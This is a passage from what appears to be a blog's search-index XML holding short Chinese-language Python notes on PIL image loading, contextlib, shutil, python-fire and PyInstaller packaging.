      <link href="/2019/11/30/deploy/python/libs/py%20pil/"/>
      <url>/2019/11/30/deploy/python/libs/py%20pil/</url>
      
        <content type="html"><![CDATA[<h2 id="打开图像"><a href="#打开图像" class="headerlink" title="打开图像"></a>打开图像</h2><ol><li>通过路径</li></ol><pre><code class="python"># PILfrom PIL import Image# Image pathim_path = &quot;./a.jpg&quot;# 1. pathim1 = Image.open(im_path)print (&#39; From image path {}&#39;.format(im1))</code></pre><ol start="2"><li>通过打开图像对象<pre><code class="python"># PILfrom PIL import Image</code></pre></li></ol><h1 id="Image-path"><a href="#Image-path" class="headerlink" title="Image path"></a>Image path</h1><p>im_path = “./a.jpg”</p><h1 id="2-file"><a href="#2-file" class="headerlink" title="2. file"></a>2. file</h1><p>with open(im_path, ‘rb’) as f:<br>    im2 = Image.open(f)<br>    print (‘ From image file {}’.format(im2))</p><pre><code>3. 打开图像字符串流```python# Platform.import platformif (&#39;2.&#39; in platform.python_version()):    from StringIO import StringIO as Bytes2Dataelse:    from io import BytesIO as Bytes2Data# PILfrom PIL import Image# Image pathim_path = &quot;./a.jpg&quot;# 3. Bytes.with open(im_path, &#39;rb&#39;) as f:    im_bytes = f.read()    im3 = Image.open(Bytes2Data(im_bytes))    print (&#39; From image bytes {}&#39;.format(im3))</code></pre><ol start="4"><li>打开包含图像的压缩包<pre><code class="python"># Platformimport platformif (&#39;2.&#39; in platform.python_version()): from StringIO import StringIO as Bytes2Dataelif (&#39;3.&#39; in platform.python_version()): from io import BytesIO as Bytes2Datafrom PIL import Image# Zipimport zipfile</code></pre></li></ol><h1 id="Zip-path"><a href="#Zip-path" class="headerlink" title="Zip path"></a>Zip path</h1><p>zip_path = “./z.zip”</p><h1 id="4-Zip"><a href="#4-Zip" class="headerlink" title="4. Zip."></a>4. Zip.</h1><p>z_file = zipfile.ZipFile(zip_path, “r”)<br>for filename in z_file.namelist():<br>    # Bytes.<br>    bytes_img = z_file.read(filename)<br>    if (0 != len(bytes_img)):<br>        im4 = Image.open(Bytes2Data(bytes_img))<br>        print(‘ From zip file {}’.format(im4))<br>    else: # directory.<br>        pass</p><pre><code></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 内置函数.md</title>
      <link href="/2019/11/30/deploy/python/built-in/py%20%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/"/>
      <url>/2019/11/30/deploy/python/built-in/py%20%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>enumerate</p></blockquote><pre><code class="python">enumerate(sequence, [start=0])# sequence -- 一个序列、迭代器或其他支持迭代对象。# start -- 下标起始位置。</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> built-in </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py contextlib.md</title>
      <link href="/2019/11/30/deploy/python/built-in/py%20contextlib/"/>
      <url>/2019/11/30/deploy/python/built-in/py%20contextlib/</url>
      
        <content type="html"><![CDATA[<p>任何对象，只要正确实现了上下文管理，就可以用于with语句。</p><blockquote><p>实现上下文管理是通过<strong>enter</strong>和<strong>exit</strong>这两个方法实现的。</p></blockquote><pre><code>class Query(object):    def __init__(self, name):        self.name = name    def __enter__(self):        print(&#39;Begin&#39;)        return self    def __exit__(self, exc_type, exc_value, traceback):        if exc_type:            print(&#39;Error&#39;)        else:            print(&#39;End&#39;)    def query(self):        print(&#39;Query info about %s...&#39; % self.name)with Query(&quot;python&quot;) as q:    q.query()</code></pre><blockquote><p>编写<strong>enter</strong>和<strong>exit</strong>仍然很繁琐，因此Python的标准库contextlib提供了更简单的写法</p></blockquote><pre><code>from contextlib import contextmanagerclass Query(object):    def __init__(self, name):        self.name = name    def query(self):        print(&#39;Query info about %s...&#39; % self.name)@contextmanagerdef create_query(name):    print(&#39;Begin&#39;)    q = Query(name)    yield q    print(&#39;End&#39;)with create_query(&quot;python&quot;) as q:    q.query()</code></pre><blockquote><p>某段代码执行前后自动执行特定代码，也可以用@contextmanager实现</p></blockquote><pre><code>from contextlib import contextmanager@contextmanagerdef tag(name):    print(&quot;&lt;%s&gt;&quot; % name)    yield    print(&quot;&lt;/%s&gt;&quot; % name)with tag(&quot;h1&quot;):    print(&quot;hello&quot;)    print(&quot;world&quot;)</code></pre><blockquote><p>如果一个对象没有实现上下文，我们就不能把它用于with语句。这个时候，可以用closing()来把该对象变为上下文对象。例如，用with语句使用urlopen()</p></blockquote><pre><code>from contextlib import closingfrom urllib.request import urlopenwith closing(urlopen(&#39;http://www.baidu.com&#39;)) as page:    for line in page:        print(line)</code></pre><blockquote><p>closing也是一个经过@contextmanager装饰的generator，这个generator编写起来其实非常简单：<br>它的作用就是把任意对象变为上下文对象，并支持with语句</p></blockquote><pre><code>@contextmanagerdef closing(thing):    try:        yield thing    finally:        thing.close()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> built-in </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py fire.md</title>
      <link href="/2019/11/30/deploy/python/libs/py%20fire/"/>
      <url>/2019/11/30/deploy/python/libs/py%20fire/</url>
      
        <content type="html"><![CDATA[<p>提供了单独执行每个方法的方式，可以用来代替传入参数选项的方式</p><blockquote><p>官方文档足够清楚，不再赘述</p></blockquote><p><a href="https://github.com/google/python-fire/blob/master/docs/guide.md" target="_blank" rel="noopener">fire github 地址</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py shutil.md</title>
      <link href="/2019/11/30/deploy/python/libs/py%20shutil/"/>
      <url>/2019/11/30/deploy/python/libs/py%20shutil/</url>
      
        <content type="html"><![CDATA[<blockquote><p>python文件复制移动shutil模块</p></blockquote><pre><code class="python">import shutil# 从源src复制到dst中去。当然前提是目标地址是具备可写权限。抛出的异常信息为IOException. # 如果当前的dst已存在的话就会被覆盖掉shutil.copyfile( src, dst) # 移动文件或重命名shutil.move( src, dst)  # 只是会复制其权限其他的东西是不会被复制的shutil.copymode( src, dst) # 复制权限、最后访问时间、最后修改时间shutil.copystat( src, dst) # 复制一个文件到一个文件或一个目录shutil.copy( src, dst)  # 在copy上的基础上再复制文件最后访问时间与修改时间也复制过来了，类似于cp –p的东西shutil.copy2( src, dst)  # 如果两个位置的文件系统是一样的话相当于是rename操作，只是改名；# 如果是不在相同的文件系统的话就是做move操作shutil.copy2( src, dst)  # 把olddir拷贝一份newdir，如果第3个参数是True，则复制目录时将保持文件夹下的符号连接，# 如果第3个参数是False，则将在复制的目录下生成物理副本来替代符号连接shutil.copytree( olddir, newdir, True/Flase)# 递归删除一个目录以及目录内的所有内容shutil.rmtree( src ) </code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py优化.md</title>
      <link href="/2019/11/30/deploy/python/py%E4%BC%98%E5%8C%96/"/>
      <url>/2019/11/30/deploy/python/py%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><h2 id="函数取别名"><a href="#函数取别名" class="headerlink" title="函数取别名"></a>函数取别名</h2><pre><code class="python">import osls = os.linesep #为函数取别名，可提高性能</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pyinstaller使用.md</title>
      <link href="/2019/11/30/deploy/python/pyinstaller%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/11/30/deploy/python/pyinstaller%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="pyinstaller使用"><a href="#pyinstaller使用" class="headerlink" title="pyinstaller使用"></a>pyinstaller使用</h1><blockquote><p>pyinstaller将py文件打包为可执行文件<br>改可执行文件自包含不需要安装py，就是执行速度比较慢<br>win 生成exe文件, 支持linux，mac  </p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code>pip install pyinstaller</code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><pre><code># 以win为例pyinstaller -F -w -i manage.ico t.py# -F：打包为单文件# -w：Windows程序，不显示命令行窗口# -i：是程序图标，# t.py 要打包的py文件</code></pre><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><blockquote><p>如果打包的代码中涉及目录操作，<br>打包出可执行文件后如果不是在文件所在目录执行的会出现未预期的结果<br>或者路径都用绝对路径</p></blockquote><p>可参考下面代码 在运行时得到相对于执行文件的路径</p><pre><code>import sysimport osprint(sys.path[0])print(sys.argv[0])print(os.path.dirname(os.path.realpath(sys.executable)))print(os.path.dirname(os.path.realpath(sys.argv[0])))</code></pre><h2 id="pyinstaller将py文件打包mac"><a href="#pyinstaller将py文件打包mac" class="headerlink" title="pyinstaller将py文件打包mac"></a>pyinstaller将py文件打包mac</h2><blockquote><p>在mac上使用时会有依赖包的问题，参考如下</p></blockquote><pre><code>pyinstaller --onefile --add-binary=&#39;/System/Library/Frameworks/Tk.framework/Tk&#39;:&#39;tk&#39; --add-binary=&#39;/System/Library/Frameworks/Tcl.framework/Tcl&#39;:&#39;tcl&#39; run.py</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
